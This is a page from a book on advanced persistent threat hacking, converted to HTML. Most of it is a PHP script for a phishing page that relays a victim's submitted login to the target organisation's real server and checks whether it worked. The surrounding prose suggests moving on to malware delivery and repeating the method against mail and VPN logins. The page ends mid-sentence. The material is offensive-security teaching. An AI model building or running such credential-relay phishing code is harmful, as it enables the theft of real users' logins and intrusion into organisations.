<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pfd3" class="pf w2 h2" data-page-no="d3"><div class="pc pcd3 w2 h2"><img class="bi x94 y13ee w6 h2e" alt="" src="bgd3.png"/><div class="t m0 xbe h10 y83 ff1 fs9 fc0 sc0 lsa ws0">188<span class="_ _d"> </span><span class="ff2 fs2 ls8">Advanced Persistent Threat Hacking<span class="_ _1e"/> </span></div><div class="t m0 x3 h44 y13ef fff fse fc0 sc0 ls0 ws0">curl_setopt($ch, CURLOPT_URL, $url);</div><div class="t m0 x3 h44 y13f0 fff fse fc0 sc0 ls0 ws0">curl_setopt($ch, CURLOPT_POST, true);</div><div class="t m0 x3 h44 y13f1 fff fse fc0 sc0 ls0 ws0">curl_setopt($ch, CURLOPT_POST, count($post_fields));</div><div class="t m0 x3 h44 y13f2 fff fse fc0 sc0 ls0 ws0">curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);</div><div class="t m0 x3 h44 y13f3 fff fse fc0 sc0 ls0 ws0">curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);</div><div class="t m0 x3 h44 y13f4 fff fse fc0 sc0 ls0 ws0">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);</div><div class="t m0 x3 h44 y13f5 fff fse fc0 sc0 ls0 ws0">$response = curl_exec($ch);</div><div class="t m0 x3 h44 y13f6 fff fse fc0 sc0 ls0 ws0">if ( !curl_error($ch)){</div><div class="t m0 x3 h44 y13f7 fff fse fc0 sc0 ls0 ws0"> if( preg_match("/Unknown user or password incorrect/",$response)){</div><div class="t m0 x3 h44 y13f8 fff fse fc0 sc0 ls0 ws0">      print "Login Failure\n";</div><div class="t m0 x3 h44 y13f9 fff fse fc0 sc0 ls0 ws0">      // Alert user to failure; prompt user to login again</div><div class="t m0 x3 h44 y13fa fff fse fc0 sc0 ls0 ws0"> }</div><div class="t m0 x3 h44 y13fb fff fse fc0 sc0 ls0 ws0"> else {</div><div class="t m0 x3 h44 y13fc fff fse fc0 sc0 ls0 ws0">      print "Login Success\n";</div><div class="t m0 x3 h44 y13fd fff fse fc0 sc0 ls0 ws0">      // return user to next phishing page</div><div class="t m0 x3 h44 y13fe fff fse fc0 sc0 ls0 ws0"> }</div><div class="t m0 x3 h44 y13ff fff fse fc0 sc0 ls0 ws0">}</div><div class="t m0 x3 h44 y1400 fff fse fc0 sc0 ls0 ws0">curl_close ($ch);</div><div class="t m0 x3 h44 y1401 fff fse fc0 sc0 ls0 ws0">?&gt;</div><div class="t m0 x4 hd y1402 ff4 fs7 fc0 sc0 ls0 ws0">In the real world, you’ll w<span class="_ _0"/>ant to do a lot more error checking and testing of your </div><div class="t m0 x3 hd y1403 ff4 fs7 fc0 sc0 ls0 ws0">PHP script; we didn’t include an<span class="_ _0"/>y of that here just for bre<span class="_ _0"/>vity’<span class="_ _2"/>s sake. <span class="_ _3"/>Y<span class="_ _3"/>ou would </div><div class="t m0 x3 hd y1404 ff4 fs7 fc0 sc0 ls0 ws0">also want to adjust the if-else statement, which checks for the failure message. F<span class="_ _0"/>or </div><div class="t m0 x3 hd y1405 ff4 fs7 fc0 sc0 ls0 ws0">example, we could redirect the user to a static “success” or “f<span class="_ _0"/>ailure” page, which </div><div class="t m0 x3 hd y1406 ff4 fs7 fc0 sc0 ls0 ws0">would then prompt them for the ne<span class="_ _0"/>xt step: either deliv<span class="_ _0"/>ering malw<span class="_ _0"/>are or simply </div><div class="t m0 x3 hd y1407 ff4 fs7 fc0 sc0 ls0 ws0">ending the phishing attack.</div><div class="t m0 x94 h2f y1408 ffe fs9 fc0 sc0 ls0 ws0">NOTE</div><div class="t m0 x94 h14 y1409 ff9 fs7 fc0 sc0 ls0 ws0">Y<span class="_ _2"/>ou should note that this method and any other methods where we attempt to send the user’<span class="_ _0"/>s data </div><div class="t m0 x94 h14 y140a ff9 fs7 fc0 sc0 ls0 ws0">to a target system will create a request from our web server to the target system, which will most </div><div class="t m0 x94 h14 y140b ff9 fs7 fc0 sc0 ls0 ws0">likely be logged into the target system.</div><div class="t m0 x4 hd y140c ff4 fs7 fc0 sc0 ls0 ws0">W<span class="_ _3"/>e can also use this same man-in-the-middle approach for any protocol we </div><div class="t m0 x3 hd y140d ff4 fs7 fc0 sc0 lsb ws16">choose. If the target or<span class="_ _0"/>ganization doesn’<span class="_ _0"/>t hav<span class="_ _0"/>e any viable web login systems, we can </div><div class="t m0 x3 hd y140e ff4 fs7 fc0 sc0 ls0 ws0">choose nearly any protocol that the user might be able to log in to, such as Simple </div><div class="t m0 x3 hd y140f ff4 fs7 fc0 sc0 ls0 ws0">Mail T<span class="_ _2"/>ransport Protocol (SMTP), Post Ofce Protocol 3 (POP3), Internet Message </div><div class="t m0 x3 hd y1410 ff4 fs7 fc0 sc0 ls0 ws0">Access Protocol (IMAP), and e<span class="_ _0"/>ven <span class="_ _2"/>VPN protocols like Point-to-Point T<span class="_ _2"/>unneling </div><div class="t m0 x3 hd y1411 ff4 fs7 fc0 sc0 ls0 ws0">Protocol (PPTP). In the follo<span class="_ _0"/>wing code, we’<span class="_ _0"/>re using the same user name and </div><div class="t m0 x3 hd y1412 ff4 fs7 fc0 sc0 ls0 ws0">password submitted by the user to attempt a login to the weaktar<span class="_ _0"/>get IMAP server<span class="_ _2"/>, </div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>